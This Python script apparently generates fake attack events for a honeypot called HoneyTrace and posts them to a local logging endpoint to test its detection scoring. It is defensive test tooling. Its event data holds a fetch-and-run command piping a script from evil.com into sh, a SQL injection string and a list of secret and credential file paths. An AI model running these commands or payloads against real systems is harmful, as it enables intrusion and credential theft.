#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
High-Risk Attack Blast for HoneyTrace
Generates ONLY clearly malicious traffic across all attack types to drive
high ML scores, alerts, and anomalies.
"""

import datetime
import random
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any

import requests

LOG_URL = "http://localhost:5000/log"  # adjust if needed

USER_AGENTS = [
    "curl/8.0.1",
    "python-requests/2.31.0",
    "git/2.34.1",
    "wget/1.21.1",
]

SENSITIVE_FILES = [
    ".env",
    ".env.production",
    "config/secrets.yml",
    "config/credentials.yml.enc",
    "aws/credentials",
    "id_rsa",
    "private.key",
    "k8s/secret.yaml",
]


def now_iso() -> str:
    return datetime.datetime.utcnow().isoformat() + "Z"


def rand_public_ip() -> str:
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        if a == 10 or (a == 172 and 16 <= b <= 31) or (a == 192 and b == 168) or a >= 224:
            continue
        return f"{a}.{b}.{c}.{d}"


def sid(ip: str) -> str:
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, f"hi-risk-{ip}"))


def attack_git_push(ip: str) -> Dict[str, Any]:
    return {
        "timestamp": now_iso(),
        "source_ip": ip,
        "protocol": "HTTP",
        "target_service": "Fake Git Repository",
        "action": "git_push",
        "target_file": None,
        "payload": {
            "commit_message": random.choice([
                "Add malicious backdoor",
                "Remove authentication and checks",
                "Install reverse shell",
                "Inject payload into production",
            ]),
            "branch": random.choice(["main", "master", "production"]),
            "files_changed": [
                "src/backdoor.py",
                "scripts/reverse_shell.sh",
                "config/secrets.yml",
            ],
            "file_count": 3,
            "contains_binary": True,
        },
        "headers": {
            "User-Agent": "git/2.34.1",
            "Content-Type": "application/json",
        },
        "session_id": sid(ip),
        "user_agent": "git/2.34.1",
    }


def attack_file_access(ip: str) -> Dict[str, Any]:
    target = random.choice(SENSITIVE_FILES)
    return {
        "timestamp": now_iso(),
        "source_ip": ip,
        "protocol": "HTTP",
        "target_service": "Fake Git Repository",
        "action": "file_access",
        "target_file": target,
        "payload": {
            "file_type": "secrets",
            "file_size": random.randint(10_000, 50_000),
            "access_method": random.choice(["direct_request", "raw_url", "api_endpoint"]),
            "path": f"/repo/{target}",
        },
        "headers": {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json,text/plain,*/*",
        },
        "session_id": sid(ip),
        "user_agent": random.choice(USER_AGENTS),
    }


def attack_cicd(ip: str) -> Dict[str, Any]:
    return {
        "timestamp": now_iso(),
        "source_ip": ip,
        "protocol": "HTTP",
        "target_service": "Fake CI/CD Runner",
        "action": "ci_job_run",
        "target_file": None,
        "payload": {
            "job_name": random.choice(["install-backdoor", "crypto-miner", "exfiltrate-data"]),
            "pipeline_id": random.randint(1000, 9999),
            "branch": "main",
            "script": "bash -c 'curl http://evil.com/sh | sh'",
            "contains_secrets": True,
        },
        "headers": {
            "User-Agent": random.choice(USER_AGENTS),
            "Authorization": "Bearer leaked_token_high_risk",
        },
        "session_id": sid(ip),
        "user_agent": random.choice(USER_AGENTS),
    }


def attack_credentials(ip: str) -> Dict[str, Any]:
    return {
        "timestamp": now_iso(),
        "source_ip": ip,
        "protocol": "HTTP",
        "target_service": "Fake CI/CD Runner",
        "action": "ci_credentials_access",
        "target_file": "config/credentials.yml.enc",
        "payload": {
            "path": "config/credentials.yml.enc",
            "reason": "export_all_tokens",
        },
        "headers": {
            "User-Agent": random.choice(USER_AGENTS),
        },
        "session_id": sid(ip),
        "user_agent": random.choice(USER_AGENTS),
    }


def attack_bruteforce(ip: str) -> Dict[str, Any]:
    return {
        "timestamp": now_iso(),
        "source_ip": ip,
        "protocol": "TCP",
        "target_service": "Fake Git Repository",
        "action": "bruteforce_login",
        "target_file": None,
        "payload": {
            "username": random.choice(["root", "admin", "devops"]),
            "password": "P@ssw0rd!" + str(random.randint(1000, 9999)),
            "attempt": random.randint(10, 50),
        },
        "headers": {
            "User-Agent": random.choice(USER_AGENTS),
        },
        "session_id": sid(ip),
        "user_agent": random.choice(USER_AGENTS),
    }


def attack_malformed(ip: str) -> Dict[str, Any]:
    body = "A" * random.randint(5000, 15000) + "' or '1'='1 --"
    return {
        "timestamp": now_iso(),
        "source_ip": ip,
        "protocol": "HTTP",
        "target_service": "Fake Git Repository",
        "action": "malformed_payload",
        "target_file": None,
        "payload": {
            "raw": body,
            "content_type": "application/x-www-form-urlencoded",
        },
        "headers": {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/x-www-form-urlencoded",
        },
        "session_id": sid(ip),
        "user_agent": random.choice(USER_AGENTS),
    }


def attack_scan(ip: str) -> Dict[str, Any]:
    return {
        "timestamp": now_iso(),
        "source_ip": ip,
        "protocol": "TCP",
        "target_service": "Unified Honeypot",
        "action": "scan_attempt",
        "target_file": None,
        "payload": {
            "ports_scanned": [22, 80, 443, 8000, 8001, 8002],
            "tool": random.choice(["nmap", "masscan"]),
            "aggressive": True,
        },
        "headers": {
            "User-Agent": random.choice(USER_AGENTS),
        },
        "session_id": sid(ip),
        "user_agent": random.choice(USER_AGENTS),
    }


ATTACK_FUNCS = [
    attack_git_push,
    attack_file_access,
    attack_cicd,
    attack_credentials,
    attack_bruteforce,
    attack_malformed,
    attack_scan,
]


def send_log(log: Dict[str, Any]) -> bool:
    try:
        r = requests.post(LOG_URL, json=log, timeout=5)
        return 200 <= r.status_code < 300
    except Exception:
        return False


def simulate_one(_) -> bool:
    ip = rand_public_ip()
    func = random.choice(ATTACK_FUNCS)
    log = func(ip)
    return send_log(log)


def main(count: int = 1000, concurrency: int = 100) -> None:
    print(f"[*] High-Risk Attack Blast -> {LOG_URL}")
    print(f"    Count: {count}, Concurrency: {concurrency}")
    start = time.time()
    success = 0
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(simulate_one, i) for i in range(count)]
        done = 0
        for f in as_completed(futures):
            done += 1
            if f.result():
                success += 1
            if done % max(1, count // 10) == 0:
                print(f"    Progress: {done}/{count} ({done * 100.0 / count:.1f}%)")
    elapsed = time.time() - start
    print("\n============================================================")
    print("HIGH-RISK ATTACK BLAST SUMMARY")
    print("============================================================")
    print(f"Total attacks: {count}")
    print(f"Successful:   {success}")
    print(f"Failed:       {count - success}")
    if elapsed > 0:
        print(f"Duration:     {elapsed:.2f}s ({count / elapsed:.2f} attacks/sec)")


if __name__ == "__main__":
    main()


